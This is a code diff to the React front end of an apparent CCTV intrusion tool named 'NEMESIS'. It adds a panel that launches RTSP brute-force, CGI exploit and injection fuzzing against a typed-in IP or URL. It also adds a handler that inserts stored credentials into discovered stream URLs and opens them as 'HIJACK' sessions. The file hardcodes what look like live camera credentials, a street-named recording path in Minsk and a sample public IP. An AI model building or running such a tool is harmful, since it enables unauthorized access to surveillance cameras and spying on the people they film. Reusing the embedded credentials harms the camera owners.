@@ -126,6 +126,8 @@ export default function App() {
   const [fuzzLogin, setFuzzLogin] = useState("mvd");
   const [fuzzPassword, setFuzzPassword] = useState("gpfZrw%9RVqp");
   const [fuzzPath, setFuzzPath] = useState("video0/[Minsk_ul._FILIMONOVA_39_]/2026-02-19/cam02_00-03-10.mkv");
+  const [targetInput, setTargetInput] = useState('');
+  const [attackType, setAttackType] = useState('RTSP_BRUTE');
   const [fuzzResults, setFuzzResults] = useState([]);
 
   const [shodanResults, setShodanResults] = useState([]);
@@ -642,18 +644,103 @@ export default function App() {
     }
   };
 
-  // --- ВОЗВРАЩАЕМ ПРОПАВШИЙ FUZZER ---
-  const handleNemesisFuzz = async () => {
-    if (!fuzzPassword) return alert("Нужен пароль для авторизации!");
+  // --- NEMESIS: универсальный запуск по введенной цели и выбранному протоколу ---
+  const handleStartNemesis = async () => {
+    const target = String(targetInput || '').trim();
+    if (!target) return alert('Введите IP или URL цели.');
+
     setLoading(true);
-    setRadarStatus('ЗАПУСК ПРОТОКОЛА NEMESIS (FUZZING)...');
+    setFuzzResults([`$ ${attackType} ${target}`]);
+    setRadarStatus(`NEMESIS EXECUTE: ${attackType} -> ${target}`);
+
     try {
-      const adminHash = await invoke('nemesis_auto_login', { username: fuzzLogin, password: fuzzPassword });
-      const getResults = await invoke('nemesis_fuzz_archive_endpoint', { adminHash, targetFtpPath: fuzzPath });
-      const postResults = await invoke('nemesis_fuzz_post_endpoints', { adminHash, targetFtpPath: fuzzPath });
-      setFuzzResults([...getResults, ...postResults]);
+      if (attackType === 'CUSTOM_INJECT') {
+        const report = await invoke('spider_full_scan', {
+          targetUrl: target,
+          cookie: hubConfig.cookie,
+          maxDepth: spiderMaxDepth,
+          maxPages: spiderMaxPages,
+          dirBruteforce: spiderDirBrute,
+          enableVulnVerification: spiderEnableVulnVerification,
+          enableOsintImport: spiderEnableOsintImport,
+          enableTopologyDiscovery: spiderEnableTopologyDiscovery,
+          enableSnapshotRefresh: spiderEnableSnapshotRefresh,
+          enableVideoStreamAnalyzer: spiderEnableVideoStreamAnalyzer,
+          enableCredentialDepthAudit: spiderEnableCredentialDepthAudit,
+          enablePassiveArpDiscovery: spiderEnablePassiveArpDiscovery,
+          enableUptimeMonitoring: spiderEnableUptimeMonitoring,
+          enableNeighborDiscovery: spiderEnableNeighborDiscovery,
+          enableThreatIntel: spiderEnableThreatIntel,
+          enableScheduledAudits: spiderEnableScheduledAudits,
+        });
+        setSpiderReport(report);
+        const apiRows = Array.isArray(report?.apiFuzzResults) ? report.apiFuzzResults : [];
+        setFuzzResults(apiRows.map((row) => {
+          const code = Number.isFinite(Number(row?.statusCode)) ? ` [${row.statusCode}]` : '';
+          return `${row?.protocol || 'GENERIC'}${code} ${row?.endpoint || ''} ${row?.verdict || ''}`.trim();
+        }));
+      } else {
+        const attackMap = {
+          RTSP_BRUTE: 'rtsp',
+          CGI_EXPLOIT: 'tdkcgi',
+          CUSTOM_INJECT: 'generic',
+        };
+        const results = await invoke('fuzz_cctv_api', {
+          targetInput: target,
+          attackType: attackMap[attackType] || 'generic',
+        });
+        const rows = Array.isArray(results) ? results : [];
+        setFuzzResults(rows.map((row) => {
+          const code = Number.isFinite(Number(row?.statusCode)) ? ` [${row.statusCode}]` : '';
+          return `${row?.protocol || attackType}${code} ${row?.endpoint || ''} ${row?.verdict || ''}`.trim();
+        }));
+      }
     } catch (err) {
       alert(`Ошибка Fuzzer: ${err}`);
+    } finally {
+      setLoading(false);
+    }
+  };
+
+
+  const handlePlayFuzzedLink = async (rawResult) => {
+    const urlMatch = rawResult.match(/(http|rtsp):\/\/[^\s]+/);
+    if (!urlMatch) return;
+    let url = urlMatch[0];
+
+    // Автоматически меняем http на rtsp, так как это скрытые видеопотоки
+    if (url.startsWith('http://')) {
+      url = url.replace('http://', 'rtsp://');
+    }
+
+    // Подставляем креды из полей NEMESIS, если их там ещё нет
+    if (fuzzLogin && !url.includes('@')) {
+      const user = encodeURIComponent(fuzzLogin);
+      const pass = encodeURIComponent(fuzzPassword);
+      url = url.replace('rtsp://', `rtsp://${user}:${pass}@`);
+    }
+
+    setLoading(true);
+    setRadarStatus(`ПЕРЕХВАТ ПОТОКА: ${url.split('@').pop()}...`);
+    try {
+      if (activeTargetId) {
+        await invoke('stop_stream', { targetId: activeTargetId });
+        await new Promise(r => setTimeout(r, 500));
+      }
+
+      const sessionId = `hijack_${Date.now()}`;
+      const wsUrl = await invoke('start_stream', { targetId: sessionId, rtspUrl: url });
+
+      // Обновляем состояния плеера
+      setStreamRtspUrl(url);
+      setStreamTerminal({ host: targetInput, login: fuzzLogin, password: fuzzPassword, name: 'NEMESIS HIJACK' });
+      setStreamChannel({ index: 1, name: 'Fuzzed Stream' });
+      setActiveTargetId(sessionId);
+      setActiveCameraName(`HIJACK :: ${url.split('@').pop()}`);
+      setActiveStream(wsUrl);
+
+    } catch (err) {
+      alert("Ошибка перехвата потока: " + err);
     } finally {
       setLoading(false);
     }
@@ -1606,6 +1693,31 @@ const handleSecurityAudit = async () => {
 
           <div style={{ display: 'flex', gap: '6px', marginBottom: '6px' }}>
             <input
+              id="nemesis-target-input"
+              style={{ flex: 1, backgroundColor: '#000', border: '1px solid #aa3333', color: '#ff6666', padding: '6px', boxSizing: 'border-box' }}
+              placeholder="TARGET URL (e.g. 93.125.2.167:2019/Streaming/Channels/101)"
+              value={targetInput}
+              onChange={e => setTargetInput(e.target.value)}
+            />
+            <select
+              style={{ width: '240px', backgroundColor: '#000', border: '1px solid #aa3333', color: '#ff6666', padding: '6px', boxSizing: 'border-box' }}
+              value={attackType}
+              onChange={e => setAttackType(e.target.value)}
+            >
+              <option value="RTSP_BRUTE">RTSP_BRUTE</option>
+              <option value="CGI_EXPLOIT">CGI_EXPLOIT</option>
+              <option value="CUSTOM_INJECT">CUSTOM_INJECT</option>
+            </select>
+            <button
+              onClick={handleStartNemesis}
+              style={{ backgroundColor: '#2a0000', border: '1px solid #ff5555', color: '#ff6666', padding: '6px 10px', cursor: 'pointer', fontSize: '11px', letterSpacing: '1px', fontWeight: 'bold' }}
+            >
+              EXECUTE
+            </button>
+          </div>
+
+          <div style={{ display: 'flex', gap: '6px', marginBottom: '6px' }}>
+            <input
               style={{ flex: 1, backgroundColor: '#000', border: '1px solid #ffaa00', color: '#ffaa00', padding: '6px', boxSizing: 'border-box' }}
               placeholder="Логин (mvd)"
               value={fuzzLogin}
@@ -1628,18 +1740,30 @@ const handleSecurityAudit = async () => {
           />
 
           <button
-            onClick={handleNemesisFuzz}
+            onClick={handleStartNemesis}
             style={{ width: '100%', backgroundColor: '#ffaa00', color: '#000', border: 'none', padding: '8px', cursor: 'pointer', fontWeight: 'bold', letterSpacing: '1px' }}>
-            ☢ ЗАПУСТИТЬ ПРОТОКОЛ NEMESIS
+            ☢ RUN LEGACY FLOW
           </button>
 
           {fuzzResults.length > 0 && (
             <div style={{ marginTop: '10px', border: '1px solid #ffaa00', background: '#050505', maxHeight: '150px', overflowY: 'auto', padding: '6px' }}>
-              {fuzzResults.map((res, idx) => (
-                <div key={idx} style={{ fontSize: '10px', color: res.includes('УСПЕХ') ? '#00ff9c' : '#ffcc00', marginBottom: '4px', wordBreak: 'break-all' }}>
-                  {res}
-                </div>
-              ))}
+              {fuzzResults.map((res, idx) => {
+                const isPlayable = res.includes('[200]') || res.includes('[401]') || res.includes('УСПЕХ') || res.includes('НАЙДЕНО');
+                const hasUrl = /(http|rtsp):\/\/[^\s]+/.test(res);
+                return (
+                  <div key={idx} style={{ fontSize: '10px', color: isPlayable ? '#00ff9c' : '#ffcc00', marginBottom: '4px', wordBreak: 'break-all', display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
+                    <span style={{ flex: 1 }}>{res}</span>
+                    {isPlayable && hasUrl && (
+                      <button
+                        onClick={() => handlePlayFuzzedLink(res)}
+                        style={{ marginLeft: '10px', background: '#1a4a4a', color: '#00f0ff', border: '1px solid #00f0ff', padding: '2px 8px', cursor: 'pointer', fontSize: '9px', fontWeight: 'bold', flexShrink: 0 }}
+                      >
+                        ▶ ПЛЕЙ
+                      </button>
+                    )}
+                  </div>
+                );
+              })}
             </div>
           )}
         </div>
